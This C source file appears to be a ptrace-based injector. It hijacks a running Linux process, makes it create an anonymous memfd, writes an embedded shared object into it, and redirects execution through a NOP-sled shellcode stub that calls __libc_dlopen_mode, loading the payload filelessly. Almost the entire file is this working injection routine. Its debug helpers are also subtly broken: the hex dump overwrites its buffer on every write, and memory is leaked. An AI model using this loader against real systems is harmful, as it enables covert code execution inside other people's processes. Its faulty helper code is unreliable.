#define _GNU_SOURCE

#define BUF_LEN 32
#define SLED_LEN 2

//https://github.com/lattera/glibc/blob/master/include/dlfcn.h#L8
#define __RTLD_DLOPEN 0x80000000

#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <stdint.h>
#include <sys/syscall.h>

#include "mlog.h"
#include "libptrace_do.h"
#include "injected.h"
#include "payload.h"

/* what loader needs to do:
 * 1. coerce call to memfd_create
 * 1. write so there
 * 1. coerce call to dlopen
 *
 */

//https://stackoverflow.com/questions/7775991/how-to-get-hexdump-of-a-structure-data
static void hexDump (char *desc, void *addr, int len) {
    int i;
    unsigned char buff[17];
    unsigned char *pc = (unsigned char*)addr;
    const size_t buf_len = 6*len; /* chosen by fair dice roll */
    char *buf = NULL;

    buf = malloc(buf_len);
    if (buf == NULL) {
        return;
    }
    buf[0] = 0;

    // Output description if given.
    if (desc != NULL)
        snprintf(buf, buf_len, "%s:\n", desc);

    if (len == 0) {
        snprintf(buf, buf_len, "  ZERO LENGTH\n");
        return;
    }
    if (len < 0) {
        snprintf(buf, buf_len, "  NEGATIVE LENGTH: %i\n",len);
        return;
    }

    // Process every byte in the data.
    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).

        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0)
                snprintf(buf, buf_len, "  %s\n", buff);

            // Output the offset.
            snprintf(buf, buf_len, "  %04x ", i);
        }

        // Now the hex code for the specific character.
        snprintf(buf, buf_len, " %02x", pc[i]);

        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e))
            buff[i % 16] = '.';
        else
            buff[i % 16] = pc[i];
        buff[(i % 16) + 1] = '\0';
    }

    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) {
        snprintf(buf, buf_len, "   ");
        i++;
    }

    // And print the final ASCII bit.
    snprintf(buf, buf_len, "  %s\n", buff);
    mlog(LINFO, buf);
    free(buf);
}

static void HexStack(void* addr, size_t len)
{
    int word_count = len / sizeof(long);

    if (len % sizeof(long)) {
        word_count++;
    }

    for (int i = 0; i < word_count; i++) {
        mlog(LINFO, "%04x\t%016lx\n", i, *(((unsigned long int*)(addr + i*sizeof(long)))));
    }
}


static void dump_regs(struct user_regs_struct *regs)
{
    mlog(LINFO, "r15:\t\t0x%016lx\n", (uint64_t)(regs->r15));
    mlog(LINFO, "r14:\t\t0x%016lx\n", (uint64_t)(regs->r14));
    mlog(LINFO, "r13:\t\t0x%016lx\n", (uint64_t)(regs->r13));
    mlog(LINFO, "r12:\t\t0x%016lx\n", (uint64_t)(regs->r12));
    mlog(LINFO, "rbp:\t\t0x%016lx\n", (uint64_t)(regs->rbp));
    mlog(LINFO, "rbx:\t\t0x%016lx\n", (uint64_t)(regs->rbx));
    mlog(LINFO, "r11:\t\t0x%016lx\n", (uint64_t)(regs->r11));
    mlog(LINFO, "r10:\t\t0x%016lx\n", (uint64_t)(regs->r10));
    mlog(LINFO, "r9:\t\t0x%016lx\n", (uint64_t)(regs->r9));
    mlog(LINFO, "r8:\t\t0x%016lx\n", (uint64_t)(regs->r8));
    mlog(LINFO, "rax:\t\t0x%016lx\n", (uint64_t)(regs->rax));
    mlog(LINFO, "rcx:\t\t0x%016lx\n", (uint64_t)(regs->rcx));
    mlog(LINFO, "rdx:\t\t0x%016lx\n", (uint64_t)(regs->rdx));
    mlog(LINFO, "rsi:\t\t0x%016lx\n", (uint64_t)(regs->rsi));
    mlog(LINFO, "rdi:\t\t0x%016lx\n", (uint64_t)(regs->rdi));
    mlog(LINFO, "orig_rax:\t0x%016lx\n", (uint64_t)(regs->orig_rax));
    mlog(LINFO, "rip:\t\t0x%016lx\n", (uint64_t)(regs->rip));
    mlog(LINFO, "cs:\t\t0x%016lx\n", (uint64_t)(regs->cs));
    mlog(LINFO, "eflags:\t\t0x%016lx\n", (uint64_t)(regs->eflags));
    mlog(LINFO, "rsp:\t\t0x%016lx\n", (uint64_t)(regs->rsp));
    mlog(LINFO, "ss:\t\t0x%016lx\n", (uint64_t)(regs->ss));
    mlog(LINFO, "fs_base:\t0x%016lx\n", (uint64_t)(regs->fs_base));
    mlog(LINFO, "gs_base:\t0x%016lx\n", (uint64_t)(regs->gs_base));
    mlog(LINFO, "ds:\t\t0x%016lx\n", (uint64_t)(regs->ds));
    mlog(LINFO, "es:\t\t0x%016lx\n", (uint64_t)(regs->es));
    mlog(LINFO, "fs:\t\t0x%016lx\n", (uint64_t)(regs->fs));
    mlog(LINFO, "gs:\t\t0x%016lx\n", (uint64_t)(regs->gs));
}

static void* find_libcbase(pid_t target)
{
    char *libc = "/libc-2";
    struct parse_maps *mymaps = get_proc_pid_maps(target);
    struct parse_maps *p = mymaps;
    void *ret = NULL;

    while (p) {
        mlog(LINFO, "pathname: '%s'", p->pathname);
        char *pos = strstr(p->pathname, libc);
        if (pos) {
            ret = (void*)(p->start_address);
            break;
        } else {
            p = p->next;
        }
    }
    free_parse_maps_list(mymaps);
    return ret;
}

static void dump_remote_addr(struct ptrace_do *target, char *desc, void *p, size_t len)
{
    unsigned long *data;
    int word_count = len / sizeof(long);

    if (len % sizeof(long)) {
        word_count++;
    }

    data = malloc(word_count * sizeof(long));
    if (data == NULL) {
        goto out;
    }

    for (int i = 0; i < word_count; i++) {
        errno = 0;
        data[i] = ptrace(PTRACE_PEEKTEXT, target->pid,
                         (void *) (p + (i * sizeof(long))), NULL);
        if(errno){
            mlog(LFAIL, "%s: ptrace(%d, %d, %lx, NULL): %s\n", program_invocation_short_name,
                 (int) PTRACE_PEEKTEXT, (int) target->pid,
                 (long unsigned int) (p + (i * sizeof(long))), strerror(errno));

            goto out;
        }
    }
    HexStack((void*)(data), len);
 out:
    return;
}

int load(pid_t pid)
{
    struct ptrace_do *target;
    int fd;

    //convention: our vs their
    char *our_filename;
    void *their_filename;
    char *our_memfd_name;
    void *target_memfd_name;
    uint8_t *our_codepage;
    void *target_codepage;
    int retval;

    void *our_libc = find_libcbase(getpid());
    void *their_libc = find_libcbase(pid);
    void *our_dlopen = dlsym(RTLD_NEXT, "__libc_dlopen_mode");
    void *their_dlopen = (our_dlopen - our_libc) + their_libc;
    mlog(LINFO, "Sizeof their_dlopen: %lu\n", sizeof(their_dlopen));

    mlog(LFAIL, "[*] Using pid %d\n", pid);
    mlog(LFAIL, "[*] our libc address:\t\t%p\n", our_libc);
    mlog(LFAIL, "[*] their libc address:\t\t%p\n", their_libc);
    mlog(LFAIL, "[*] our __libc_dlopen_mode:\t%p\n", our_dlopen);
    mlog(LFAIL, "[*] their dlopen should be:\t%p\n", their_dlopen);

    target = ptrace_do_init(pid);

    struct user_regs_struct saved_regs;
    memcpy(&saved_regs, &(target->saved_regs), sizeof(saved_regs));

    // coerce memfd_create
    our_memfd_name = (char*)ptrace_do_malloc(target, BUF_LEN);
    snprintf(our_memfd_name, BUF_LEN - 1, "YOLO");
    target_memfd_name = ptrace_do_push_mem(target, our_memfd_name);
    fd = ptrace_do_syscall(target, __NR_memfd_create, (uint64_t)target_memfd_name, 1, 0, 0, 0, 0);

    our_filename = ptrace_do_malloc(target, BUF_LEN);
    snprintf(our_filename, BUF_LEN-1, "/proc/%d/fd/%d", pid, fd);
    their_filename = ptrace_do_push_mem(target, our_filename);

    //jam our payload there
    FILE *memfd;
    memfd = fopen(our_filename, "w");
    size_t written = fwrite(injected_so, 1, injected_so_len, memfd);
    if (written != injected_so_len) {
        mlog(LFAIL, "[-] didn't write all of payload\n");
    }
    fclose(memfd);

    //adapted from call_fprintf.c
    our_codepage = ptrace_do_malloc(target, 4096);
    target_codepage = ptrace_do_push_mem(target, our_codepage); //just to get the address
    mlog(LFAIL, "[*] target codepage: \t\t%p\n", target_codepage);
    memset(our_codepage, 0, 4096);
    size_t offset = 0;
    for (int i= 0; i < SLED_LEN; i++) {
        our_codepage[offset++] = 0x90; //nop sled
    }
    // size of payload, minus three 64bit addresses
    memcpy(our_codepage + offset, payload_bin, payload_bin_len - 3*8);
    offset += payload_bin_len - 3*8;
    memcpy(our_codepage + offset, &their_dlopen, 8); offset += 8;
    memcpy(our_codepage + offset, &their_filename, 8); offset += 8;
    memcpy(our_codepage + offset, &(saved_regs.rip), 8); offset += 8;
    hexDump("contents", our_codepage, payload_bin_len + 4*8);
    target_codepage = ptrace_do_push_mem(target, our_codepage);
    mlog(LFAIL, "[*] target codepage: \t\t%p\n", target_codepage);

    struct user_regs_struct attack_regs;

    memcpy(&attack_regs, &(target->saved_regs), sizeof(attack_regs));

    mlog(LINFO, "stack ptr: %p\n", (void*)(attack_regs.rsp));
    mlog(LINFO, "syscall @ %p\n", (void*)(saved_regs.rip));
    dump_remote_addr(target, "stack", (void*)(attack_regs.rsp), 8*32);

    attack_regs.rip = (uint64_t)target_codepage+2;
    dump_regs(&attack_regs);

    if((retval = ptrace(PTRACE_SETREGS, target->pid, NULL, &attack_regs)) == -1){
        mlog(LFAIL, "%s: ptrace(%d, %d, %lx, %lx): %s\n", program_invocation_short_name, \
                (int) PTRACE_SETREGS, (int) target->pid, (long unsigned int) NULL, \
                (long unsigned int) &attack_regs, strerror(errno));
        return(-1);
    }

    mlog(LFAIL, "[*] detaching execution\n");
    if ((retval = ptrace(PTRACE_DETACH, target->pid, NULL, NULL)) == -1) {
        mlog(LFAIL, "ptrace(PTRACE_DETACH): %s\n", strerror(errno));
        return(-1);
    }

    return 0;
}

/*
 * Editor modelines  -  https://www.wireshark.org/tools/modelines.html
 *
 * Local variables:
 * c-basic-offset: 4
 * tab-width: 8
 * indent-tabs-mode: nil
 * End:
 *
 * vi: set shiftwidth=4 tabstop=8 expandtab:
 * :indentSize=4:tabSize=8:noTabs=true:
 */
